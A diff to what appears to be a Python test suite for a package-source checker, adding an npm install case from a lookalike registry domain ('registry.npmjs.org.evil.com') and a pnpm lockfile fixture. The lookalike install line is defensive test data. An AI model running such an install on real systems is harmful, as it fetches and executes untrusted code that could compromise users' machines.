@@ -240,6 +240,11 @@ def test_evaluate_package_request_artifact_uses_manager_specific_fix_command(
         ("npm install guard-http@http://example.com/guard.tgz", "block", "insecure_source_url"),
         ("npm install guard-https@https://example.com/guard.tgz", "warn", "external_tarball_source"),
         ("npm install guard-query@https://example.com/guard.tgz?token=demo", "warn", "external_tarball_source"),
+        (
+            "npm install guard-lookalike@https://registry.npmjs.org.evil.com/guard.tgz",
+            "warn",
+            "external_tarball_source",
+        ),
     ],
 )
 def test_evaluate_package_request_artifact_applies_js_source_heuristics(
@@ -295,6 +300,20 @@ importers:
         version: 1.2.8
 packages:
   minimist@1.2.8:
+    resolution: {integrity: sha512-demo}
+""",
+        ),
+        (
+            "pnpm add minimist@^1.2.0",
+            "pnpm-lock.yaml",
+            """
+lockfileVersion: 5.4
+specifiers:
+  minimist: ^1.2.0
+dependencies:
+  minimist: 1.2.8
+packages:
+  /minimist/1.2.8:
     resolution: {integrity: sha512-demo}
 """,
         ),
